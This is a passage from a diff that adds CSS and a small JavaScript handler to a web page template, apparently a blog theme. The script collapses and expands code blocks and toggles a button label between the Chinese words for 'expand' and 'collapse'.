+  position: absolute;
+  left:0;
+  bottom:0;
+  width:100%;
+  height: 80px;
+  background: linear-gradient(transparent, var(--pre-background-color));
+  pointer-events: none;
+}
+ 
+.article-content .code-expand-btn {
+  position:absolute;
+  bottom:8px;
+  right:12px;
+  z-index:2;
+  border: none;
+  padding: 4px 8px;
+  border-radius: 6px;
+  background: var(--card-background);
+  color: var(--text-color);
+  cursor: pointer;
+}
+</style>
+<script>
+document.addEventListener('DOMContentLoaded', ()=>{
+  document.querySelectorAll('.highlight-wrap').forEach(wrap=>{
+    const btn = wrap.querySelector('.code-expand-btn');
+    btn.addEventListener('click', ()=>{
+      wrap.classList.toggle('collapse');
+      btn.innerText = wrap.classList.contains('collapse') ? "▼ 展开" : "▲ 收起";
+    })
+  })
+})
+</script>
+
+    </body>
+</html>
